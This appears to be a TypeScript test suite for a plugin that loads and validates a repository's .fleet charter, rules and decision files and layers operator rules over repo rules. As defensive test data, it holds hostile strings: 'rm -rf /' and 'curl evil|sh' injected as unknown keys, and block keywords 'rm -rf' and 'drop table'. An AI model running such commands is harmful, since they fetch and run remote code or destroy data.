import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { MAX_FILE_BYTES, buildProjectRecord, mergeRules, parseCharter, parseDecision, parseRules, type Rule } from "./project.js";
import { loadProjectRecord } from "./project-load.js";
import { loadEntry, loadPlugin, type Loaded } from "./testkit/plugin.js";

const CHARTER = `---\nschemaVersion: 1\nname: demo\n---\n\n## Goal\n\nShip it.\n\n## Non-goals\n\n- a UI\n- notifications\n`;
const RULES = `schemaVersion: 1\nrules:\n  - id: r1\n    severity: advise\n    match: { paths: [src/a/] }\n    message: be careful\n`;
const DECISION = `---\nschemaVersion: 1\nid: "0001"\ntitle: Use X\nstatus: accepted\ndate: 2026-01-02\nscope: [src/a/]\n---\n\n## Decision\n\nUse X.\n`;
const rule = (over: Partial<Rule> = {}): Rule => ({ id: "r1", severity: "advise", message: "m", match: { paths: ["src/a/"] }, ...over });

describe("#114: charter", () => {
  it("parses frontmatter and sections into typed fields", () => {
    const r = parseCharter(CHARTER);
    expect(r.errors).toEqual([]);
    expect(r.charter).toMatchObject({ schemaVersion: 1, name: "demo", goal: "Ship it.", nonGoals: ["a UI", "notifications"] });
  });
  it("rejects unknown keys, unknown sections, wrong version, missing frontmatter", () => {
    expect(parseCharter(CHARTER.replace("name: demo", "name: demo\nrunThis: rm -rf /")).errors[0]).toMatchObject({ file: "charter.md", field: "runThis" });
    expect(parseCharter(CHARTER + "\n## Secrets\n\nx\n").errors[0]).toMatchObject({ field: "secrets" });
    expect(parseCharter(CHARTER.replace("schemaVersion: 1", "schemaVersion: 2")).errors[0]).toMatchObject({ field: "schemaVersion" });
    expect(parseCharter("## Goal\n\nno frontmatter").errors[0].message).toMatch(/frontmatter/);
  });
  it("bounds section size and list length", () => {
    expect(parseCharter(CHARTER.replace("Ship it.", "x".repeat(4001))).errors[0]).toMatchObject({ field: "goal" });
    const many = Array.from({ length: 51 }, (_, i) => `- n${i}`).join("\n");
    expect(parseCharter(CHARTER.replace("- a UI\n- notifications", many)).errors[0]).toMatchObject({ field: "nonGoals" });
  });
});

describe("#114: rules", () => {
  it("parses a rule with paths", () => {
    const r = parseRules(RULES);
    expect(r.errors).toEqual([]);
    expect(r.rules[0]).toMatchObject({ id: "r1", severity: "advise", match: { paths: ["src/a/"] } });
  });
  it("rejects unknown keys (where behaviour would be smuggled), bad ids, duplicates, empty match", () => {
    const bad = (body: string) => parseRules(`schemaVersion: 1\nrules:\n${body}`).errors;
    expect(bad("  - id: r1\n    severity: advise\n    match: { paths: [a/] }\n    message: m\n    run: curl evil|sh\n")[0]).toMatchObject({ field: "rules[0].run" });
    expect(bad("  - id: BAD ID\n    severity: advise\n    match: { paths: [a/] }\n    message: m\n")[0]).toMatchObject({ field: "rules[0].id" });
    expect(bad("  - id: a\n    severity: advise\n    match: {}\n    message: m\n")[0]).toMatchObject({ field: "rules[0].match" });
    expect(bad("  - id: a\n    severity: advise\n    match: { paths: [a/] }\n    message: m\n  - id: a\n    severity: advise\n    match: { paths: [b/] }\n    message: m\n").map((e) => e.message).join()).toContain("duplicate");
  });
  it("a repo cannot declare `block`; the error says what to use instead", () => {
    const e = parseRules(RULES.replace("advise", "block")).errors[0];
    expect(e).toMatchObject({ field: "rules[0].severity", message: expect.stringContaining("operator-only") });
    expect(parseRules(RULES.replace("advise", "block"), "rules.yml", true).errors).toEqual([]);
  });
  it("YAML hazards are refused: aliases, duplicate keys, bad syntax, wrong shape", () => {
    expect(parseRules("schemaVersion: 1\nrules: &a []\nmore: *a\n").errors.length).toBeGreaterThan(0);
    expect(parseRules("schemaVersion: 1\nschemaVersion: 1\nrules: []\n").errors[0].message).toMatch(/YAML/);
    expect(parseRules("rules: [").errors[0].message).toMatch(/YAML/);
    expect(parseRules("- just\n- a list\n").errors[0].message).toMatch(/mapping/);
  });
  it("absolute and parent paths in match.paths are refused (same rules as a task scope)", () => {
    expect(parseRules(RULES.replace("src/a/", "../etc")).errors[0]).toMatchObject({ field: "rules[0].match.paths" });
    expect(parseRules(RULES.replace("src/a/", "/etc")).errors[0]).toMatchObject({ field: "rules[0].match.paths" });
  });
});

describe("#114: decisions", () => {
  it("parses; id must match the file name; dates and status are checked", () => {
    expect(parseDecision(DECISION, "0001-use-x.md").decision).toMatchObject({ id: "0001", slug: "use-x", status: "accepted", date: "2026-01-02", decision: "Use X." });
    expect(parseDecision(DECISION, "0002-use-x.md").errors[0]).toMatchObject({ field: "id" });
    expect(parseDecision(DECISION, "use-x.md").errors[0].message).toMatch(/NNNN-slug/);
    expect(parseDecision(DECISION.replace("accepted", "maybe"), "0001-use-x.md").errors[0]).toMatchObject({ field: "status" });
    expect(parseDecision(DECISION.replace("2026-01-02", "yesterday"), "0001-use-x.md").errors[0]).toMatchObject({ field: "date" });
    expect(parseDecision(DECISION.replace("title: Use X", "title: Use X\nexec: x"), "0001-use-x.md").errors[0]).toMatchObject({ field: "exec" });
  });
});

describe("#114: layering (a repo can add, never weaken)", () => {
  it("a repo adds new rules; they only advise unless the operator allows repo blocking", () => {
    const repo = [rule({ id: "mine", severity: "block-candidate" })];
    expect(mergeRules({ repo }).rules[0]).toMatchObject({ id: "mine", source: "repo", enforced: "advise" });
    expect(mergeRules({ repo, allowRepoBlocking: true }).rules[0]).toMatchObject({ enforced: "block" });
  });
  it("an operator block cannot be downgraded or redefined by the repo", () => {
    const operator = [rule({ id: "sec", severity: "block", message: "operator says no", match: { paths: ["src/guard.ts"] } })];
    const m = mergeRules({ operator, repo: [rule({ id: "sec", severity: "advise", message: "nah", match: { paths: ["nothing/"] } })] });
    expect(m.rules).toHaveLength(1);
    expect(m.rules[0]).toMatchObject({ severity: "block", enforced: "block", message: "operator says no", match: { paths: ["src/guard.ts"] }, source: "operator" });
    expect(m.warnings.join("\n")).toMatch(/lower the operator severity block to advise/);
    expect(m.warnings.join("\n")).toMatch(/redefines/);
  });
  it("a repo may tighten an operator advise rule to block-candidate, which blocks only if allowed", () => {
    const operator = [rule({ id: "x", severity: "advise" })];
    const repo = [rule({ id: "x", severity: "block-candidate" })];
    expect(mergeRules({ operator, repo }).rules[0]).toMatchObject({ severity: "block-candidate", enforced: "advise" });
    expect(mergeRules({ operator, repo, allowRepoBlocking: true }).rules[0]).toMatchObject({ enforced: "block" });
  });
  it("an operator rule cannot weaken a built-in one; precedence builtin < operator < repo for additions", () => {
    const builtin = [rule({ id: "b", severity: "block" })];
    expect(mergeRules({ builtin, operator: [rule({ id: "b", severity: "advise" })] }).rules[0]).toMatchObject({ severity: "block", source: "operator", enforced: "block" });
    expect(mergeRules({ builtin, operator: [rule({ id: "o" })], repo: [rule({ id: "r" })] }).rules.map((r) => [r.id, r.source])).toEqual([["b", "builtin"], ["o", "operator"], ["r", "repo"]]);
  });
  it("operator-required charter fields cannot be dropped by a repo", () => {
    const rec = buildProjectRecord({ charterText: CHARTER, operator: { requireCharterFields: ["goal", "successCriteria", "nope"] } });
    expect(rec.errors.map((e) => e.field)).toEqual(["successCriteria", "project.requireCharterFields"]);
  });
  it("operator rules are validated too, and a bad one is an error, not silently dropped", () => {
    const rec = buildProjectRecord({ operator: { rules: [{ id: "x", severity: "block", match: {}, message: "m" }] } });
    expect(rec.errors.length).toBeGreaterThan(0);
    const ok = buildProjectRecord({ operator: { rules: [{ id: "x", severity: "block", match: { keywords: ["rm -rf"] }, message: "m" }] } });
    expect(ok.errors).toEqual([]);
    expect(ok.rules[0]).toMatchObject({ source: "operator", enforced: "block" });
  });
});

const dir = () => mkdtempSync(join(tmpdir(), "fleetproj-"));
const write = (root: string, rel: string, text: string) => { mkdirSync(join(root, rel, ".."), { recursive: true }); writeFileSync(join(root, rel), text); };

describe("#114: loader", () => {
  it("no .fleet is simply absent", async () => {
    expect(await loadProjectRecord(dir())).toEqual({ present: false });
  });
  it("reads a full record and reports what it ignored", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", CHARTER);
    write(d, ".fleet/rules.yml", RULES);
    write(d, ".fleet/decisions/0001-use-x.md", DECISION);
    write(d, ".fleet/decisions/notes.txt", "x");
    write(d, ".fleet/random.sh", "x");
    const r = await loadProjectRecord(d);
    expect(r.present && r.record.errors).toEqual([]);
    expect(r.present && r.record).toMatchObject({ charter: { goal: "Ship it." }, rules: [{ id: "r1" }], decisions: [{ id: "0001" }] });
    expect(r.present && r.ignored.sort()).toEqual(["decisions/notes.txt", "random.sh"]);
  });
  it("refuses symlinks (a file, the decisions dir, or .fleet itself) instead of following them", async () => {
    const outside = dir();
    write(outside, "secret.md", CHARTER);
    const a = dir();
    mkdirSync(join(a, ".fleet"));
    symlinkSync(join(outside, "secret.md"), join(a, ".fleet", "charter.md"));
    const ra = await loadProjectRecord(a);
    expect(ra.present && ra.record.errors[0]).toMatchObject({ file: "charter.md", message: expect.stringContaining("symlink") });
    expect(ra.present && ra.record.charter).toBeUndefined();
    const b = dir();
    symlinkSync(outside, join(b, ".fleet"));
    const rb = await loadProjectRecord(b);
    expect(rb.present && rb.record.errors[0].message).toMatch(/symlink/);
    const c = dir();
    mkdirSync(join(c, ".fleet"));
    symlinkSync(outside, join(c, ".fleet", "decisions"));
    const rc = await loadProjectRecord(c);
    expect(rc.present && rc.record.errors[0]).toMatchObject({ file: "decisions/" });
  });
  it("oversized files are rejected with the file named; the rest still load", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", CHARTER);
    write(d, ".fleet/rules.yml", "x".repeat(MAX_FILE_BYTES + 1));
    const r = await loadProjectRecord(d);
    expect(r.present && r.record.errors[0]).toMatchObject({ file: "rules.yml", message: expect.stringContaining("larger than") });
    expect(r.present && r.record.charter?.goal).toBe("Ship it.");
  });
  it("malformed content yields precise errors with file and field, never a throw", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", "nonsense");
    write(d, ".fleet/rules.yml", "rules: [");
    write(d, ".fleet/decisions/0001-x.md", DECISION.replace("status: accepted", "status: nope"));
    const r = await loadProjectRecord(d);
    expect(r.present && r.record.errors.map((e) => e.file).sort()).toEqual(["charter.md", "decisions/0001-x.md", "rules.yml"]);
  });
  it("DOGFOOD: this repository's own .fleet/ validates and carries the project's rules", async () => {
    const root = fileURLToPath(new URL("..", import.meta.url));
    const r = await loadProjectRecord(root);
    expect(r.present).toBe(true);
    if (!r.present) return;
    expect(r.record.errors).toEqual([]);
    expect(r.record.warnings).toEqual([]);
    expect(r.record.rules.map((x) => x.id).sort()).toEqual(["loop-survives-restart", "protocol-older-node-test", "redaction-false-positive-test", "security-independent-review", "serialize-manager-gates"]);
    expect(r.record.decisions.map((x) => x.id)).toEqual(["0001", "0002", "0003", "0004"]);
    expect(r.record.charter?.nonGoals?.length).toBeGreaterThan(0);
    expect(r.record.rules.every((x) => x.enforced === "advise")).toBe(true); // repo blocking is off by default
  });
});

const entry = await loadEntry();
it.skipIf(!process.env.CI)("CI: the plugin entry loads, so the fleet_project_show tests really ran", () => { expect(entry).toBeDefined(); });

describe.skipIf(!entry)("#114: fleet_project_show", () => {
  let p: Loaded | undefined;
  afterEach(() => { p?.dispose(); p = undefined; });
  const load = (project?: Record<string, unknown>) => loadPlugin(entry!, { nodes: [], config: { ...(project ? { project } : {}) }, invoke: () => ({}) });
  it("shows the validated record and marks it untrusted", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", CHARTER);
    p = load({ roots: [d] });
    const r = await p.call("fleet_project_show", { path: d }) as { ok: boolean; present: boolean; untrusted: string; record: { charter: { goal: string } } };
    expect(r).toMatchObject({ ok: true, present: true, record: { charter: { goal: "Ship it." } } });
    expect(r.untrusted).toMatch(/not instructions/);
  });
  it("reports errors with ok:false, and absence plainly", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", "nope");
    p = load({ roots: [d] });
    expect(await p.call("fleet_project_show", { path: d })).toMatchObject({ ok: false, present: true, record: { errors: [{ file: "charter.md" }] } });
    expect(await p.call("fleet_project_show", { path: dir() })).toMatchObject({ ok: false });
  });
  it("refuses paths outside project.roots, relative paths, and `..` escapes via symlink", async () => {
    const root = dir();
    const other = dir();
    write(other, ".fleet/charter.md", CHARTER);
    symlinkSync(other, join(root, "link"));
    p = load({ roots: [root] });
    expect(await p.call("fleet_project_show", { path: other })).toMatchObject({ ok: false, error: expect.stringContaining("outside") });
    expect(await p.call("fleet_project_show", { path: join(root, "link") })).toMatchObject({ ok: false, error: expect.stringContaining("outside") });
    expect(await p.call("fleet_project_show", { path: "relative/dir" })).toMatchObject({ ok: false });
  });
  it("layers operator config: rules, required fields, repo blocking", async () => {
    const d = dir();
    write(d, ".fleet/charter.md", CHARTER);
    write(d, ".fleet/rules.yml", RULES.replace("advise", "block-candidate"));
    p = load({ roots: [d], allowRepoBlocking: true, requireCharterFields: ["goal", "users"], rules: [{ id: "op", severity: "block", match: { keywords: ["drop table"] }, message: "no" }] });
    const r = await p.call("fleet_project_show", { path: d }) as { ok: boolean; record: { errors: Array<{ field: string }>; rules: Array<{ id: string; enforced: string }> } };
    expect(r.ok).toBe(false);
    expect(r.record.errors.map((e) => e.field)).toEqual(["users"]);
    expect(r.record.rules.map((x) => [x.id, x.enforced])).toEqual([["op", "block"], ["r1", "block"]]);
  });
});
